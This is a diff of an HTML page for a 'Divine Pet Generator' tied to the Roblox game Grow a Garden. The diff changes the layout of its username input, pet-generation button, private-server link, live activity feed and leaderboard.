@@ -3,30 +3,44 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Roblox Pet Generator</title>
+  <title>Grow a Garden Pet Generator</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="container">
-    <h1>🐾 Divine Pet Generator</h1>
+  <!-- Banner -->
+  <div id="banner">
+    <span id="banner-text">🐾 Welcome to the Divine Pet Generator!</span>
+  </div>
+
+  <main>
+    <h1>Divine Pet Generator</h1>
 
     <!-- Username Input -->
-    <div class="generator-box">
+    <section>
       <input type="text" id="username" placeholder="Enter Roblox Username">
-      <button id="checkBtn">Start</button>
+      <button onclick="startGenerator()">Search</button>
       <div id="profile"></div>
+    </section>
+
+    <!-- Generator -->
+    <section id="generator-section" style="display:none;">
+      <button onclick="generatePet()">🎲 Generate Pet</button>
       <div id="result"></div>
-      <div id="serverButton"></div>
-    </div>
+      <a id="join-btn" href="https://roblox.com" target="_blank" style="display:none;">⬇️ Join Private Server</a>
+    </section>
 
     <!-- Live Activity -->
-    <h2>🎉 Live Activity</h2>
-    <div id="activityFeed" class="activity-feed"></div>
+    <section>
+      <h2>🌍 Live Activity</h2>
+      <div id="activity-feed" class="feed"></div>
+    </section>
 
     <!-- Leaderboard -->
-    <h2>🏆 Leaderboard</h2>
-    <div id="leaderboard" class="leaderboard"></div>
-  </div>
+    <section>
+      <h2>🏆 Leaderboard</h2>
+      <div id="leaderboard-list" class="leaderboard"></div>
+    </section>
+  </main>
 
   <script src="app.js"></script>
 </body>
